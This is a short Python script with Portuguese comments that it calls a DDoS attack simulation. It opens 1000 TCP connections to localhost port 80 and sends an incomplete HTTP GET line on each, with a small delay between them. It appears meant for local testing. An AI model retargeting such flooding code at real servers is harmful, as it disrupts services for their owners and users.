import socket
import time

target_ip = "127.0.0.1"  # Usando o endereço IP do loopback para testes locais
target_port = 80  # Porta padrão para HTTP

# Configura quantas requisições serao feitas
number_of_requests = 1000

print("Iniciando simulação de ataque DDoS...")

for i in range(number_of_requests):
    try:
        # Criar um socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((target_ip, target_port))
        sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
        sock.close()
    except socket.error as e:
        print(f"Erro ao conectar: {e}")
    
    # Adicione um pequeno delay para não travar a máquina
    time.sleep(0.01)

print("Simulação de ataque DDoS concluída.")
